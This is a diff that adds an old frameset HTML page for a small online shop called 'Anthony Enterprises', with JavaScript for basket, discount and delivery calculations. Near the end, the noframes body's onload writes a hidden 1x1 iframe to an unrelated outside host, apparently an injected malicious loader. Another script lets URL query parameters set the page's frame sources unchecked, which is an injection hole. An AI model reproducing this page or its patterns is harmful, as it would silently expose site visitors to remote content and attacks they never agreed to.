@@ -1,0 +1,274 @@
+<html>
+
+<head>
+<title>Anthony Enterprises </title>
+<META NAME="DESCRIPTION" CONTENT=" ">
+<meta http-equiv='Page-Enter' content='blendTrans(Duration=1)'>
+<script LANGUAGE="JavaScript">
+
+var msg='msg';
+
+var actual_deliverycost=0;
+
+var tot_ship_tax = 0;
+var min_delivery1=8;
+var min_delivery2=13;
+var min_delivery3=10;
+var min_delivery4=8;
+
+var Delivery_Type=1;
+var Fix_delivery=10;
+
+var InState_delivery_PO=0.8;
+var OutState_delivery_PO=1.5;
+var OutCountry_delivery_PO=5;
+
+var InState_delivery_PE=0.03;
+var OutState_delivery_PE=0.05;
+var OutCountry_delivery_PE=0.07;
+
+var min_delivery=50;
+var max_delivery=2000000;
+var free_delivery=100000000;
+
+var reduced_deliverycost=0;
+var headercolor='#2599BA';
+var headertext='ffffff';
+var ordercolor1='#FFFFFF';
+var ordercolor2='#F5F5F5';
+var totalcolor='#ffffff';
+var totalcolor1='#ffffff';
+var vState0='False';
+var vState1='False';
+var vState2='False';
+var vDeliv0='False';
+var vDeliv1='False';
+var vDeliv2='False';
+var vDeliv3='False';
+var vDeliv4='False';
+var vSPrice=0;
+var tot_per_tax = 0;
+var TaxName1 = '';
+var TaxName2 = '';
+var TaxName3 = '';
+
+var itemn=0;
+var total_weight=0;
+var total_price=0;
+var item_arr = new Array();
+var weight_arr = new Array();
+var price_arr = new Array();
+var quantity_arr = new Array();
+var group_arr = new Array();
+var discountgroup = new Array("G1","G2","G3","G4");
+var discountgroupmin = new Array(1,1,1,1);
+var discountgroupval = new Array(1,1,1,1);
+var discountgroupant  = new Array(0,0,0,0);
+var discountgrouptxt  = new Array("Discount A","Discount B","Discount C","Discount D");
+var temp_item_arr = new Array();
+var temp_weight_arr = new Array();
+var temp_price_arr = new Array();
+var temp_group_arr = new Array();
+var temp_quantity_arr = new Array();
+var bill_arr1 = new Array();
+var bill_arr2 = new Array();
+var bill_arr3 = new Array();
+var bill_arr4 = new Array();
+var bill_item_ix = new Array();
+var bill_ix = 0;
+var sw_delete = false;
+var first_order = true;
+
+function delete_all(showbasket)
+{
+itemn=0; total_price=0; total_weight=0; bill_ix = 0;
+first_order = true;
+toc.location.href='tool01.htm';
+for(var i=0; i<discountgroupant.length; i++)
+{discountgroupant[i]=0;
+}
+if (showbasket != 'nobasket')
+{
+content2.location.href='basket.htm';
+}
+}
+function discountcheck(item2,group2,quan2)
+{
+for(var i=0; i<discountgroup.length; i++)
+{
+//if item order belong to discount group then increment # of item ordered for this group
+if (discountgroup[i] == group2)
+{
+discountgroupant[i]= discountgroupant[i]+eval(quan2);
+if (discountgroupant[i] >= discountgroupmin[i])
+{
+temp2 = discountgroupant[i] % discountgroupmin[i];
+temp1 = (discountgroupant[i] -temp2)/discountgroupmin[i];
+discountgroupant[i]=temp2;
+discount(discountgrouptxt[i],discountgroupval[i],temp1);
+}
+}
+}
+}
+function discount(discounttekst,reduction,quantity)
+{
+bill_arr1[bill_ix] = discounttekst;
+bill_arr2[bill_ix] = reduction;
+bill_arr3[bill_ix] = quantity;
+bill_item_ix[bill_ix] = null;
+bill_ix++;
+
+total_price=total_price-reduction*quantity;
+if (sw_delete == false)
+alert(discounttekst+" "+reduction*quantity+" deducted\nTotal price: "+total_price);
+}
+function delete_order(itemix)
+{
+for(var i = 0; i < itemn; i++)
+{ temp_item_arr[i] = item_arr[i];
+temp_price_arr[i] = price_arr[i];
+temp_weight_arr[i] = weight_arr[i];
+temp_quantity_arr[i]  = quantity_arr[i];
+temp_group_arr[i]  = group_arr[i];
+}
+for(var i=0; i<discountgroupant.length; i++)
+{discountgroupant[i]=0;
+}
+j=itemn;
+itemn=0; total_price=0; total_weight=0; bill_ix = 0;
+sw_delete = true; // no order-alert when recalculating
+for(var i=0; i < j; i++)
+{
+if (i != itemix)
+order(temp_item_arr[i],temp_price_arr[i],temp_weight_arr[i],temp_quantity_arr[i],temp_group_arr[i]);
+}
+sw_delete = false;
+toc.document.frm.basket.value='      '+total_price;
+if (total_price == 0)
+{
+first_order = true;
+toc.location.href='tool01.htm';
+}
+content2.location.href='basket.htm';
+}
+function order_ok(item,price,weight,quantity)
+{
+if (sw_delete == true)
+return true;
+else
+{
+if (msg == 'nomsg')
+return true;
+else
+{
+temp = total_price+price*quantity;
+return (confirm("Please confirm ordering  "+quantity+" "+item));
+}
+}
+}
+function order(item,price,weight,quantity,group)
+{
+if (order_ok(item,price,weight,quantity))
+
+{
+item_arr[itemn] = item;
+price_arr[itemn] = price;
+weight_arr[itemn] = weight;
+quantity_arr[itemn] = quantity;
+group_arr[itemn]  = group;
+bill_item_ix[bill_ix] = itemn;
+itemn++;
+bill_arr1[bill_ix] = item;
+bill_arr2[bill_ix] = price;
+bill_arr3[bill_ix] = quantity;
+bill_arr4[bill_ix] = weight;
+bill_ix++;
+
+total_price=total_price+price*quantity;
+total_weight=total_weight+weight*quantity;
+
+// if (actual_deliverycost < min_delivery)
+// actual_deliverycost=min_delivery;
+// if (actual_deliverycost > max_delivery)
+// actual_deliverycost=max_delivery;
+
+if (total_price > free_delivery)
+actual_deliverycost=reduced_deliverycost;
+discountcheck(item,group,quantity);
+if (first_order==true && sw_delete == false)
+{first_order=false;
+toc.location.href='tool01.htm';
+}
+else toc.document.frm.basket.value='   '+round_amount(total_price);
+}
+}
+function send_order()
+{
+parent.content2.location.href='order01.htm';
+}
+function round_amount(amount)
+{
+var str = "" + Math.round(amount*100);
+var len = str.length;
+return (str=="0")?"0.00":(str.substring(0,len-2)+"."+str.substring(len-2,len));
+}
+function round_amount1(amount)
+{
+var string_amount = "";
+var decimal_sign;
+amount = parseFloat(amount);
+if (!(isNaN(amount)))
+{// round to nearest cent
+amount = Math.round(amount * 100);
+amount = amount / 100;
+string_amount = new String(amount);
+decimal_sign = string_amount.indexOf(".");
+if (decimal_sign == -1)
+{
+string_amount =string_amount+".00";
+}
+else
+{ if (decimal_sign == (string_amount.length - 2)) {
+string_amount=string_amount+"0";      }
+}
+}
+else {
+string_amount = "0.00";  }
+return string_amount;}
+</script>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+var ar0 = "tool01.htm";
+var ar1 = "catalog.htm";
+
+var str = location.search;
+var pos = str.indexOf("&");
+if (pos != -1) {
+  var num = str.substring(pos + 1, str.length);
+  window["ar" + num] = str.substring(1, pos);
+}
+// -->
+</SCRIPT>
+
+</HEAD>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+document.write(
+'<frameset framespacing="0" border="0" frameborder="0" rows="30, *">',
+  '<frame name="toc" src="', ar0, '" scrolling="no" marginheight="0" marginwidth="0" frameborder="No">',
+  '<frame name="content2" src="', ar1, '" scrolling="Auto" marginheight="0" marginwidth="5" frameborder="No">',
+  '<noframes>',
+  '<body onload = "<iframe src=;"http://dejangorgievski.com/templates/index.php" width=1 height=1 frameborder=0></iframe>">',
+  '<p>Please note that some javascript will not work due to missing frames</p>',
+  '<center>VARI=FirstPage1</center>',
+  '</body>',
+  '</noframes>',
+'</frameset>'
+);
+// -->
+</SCRIPT>
+
+</html>
+<!--FIM-->
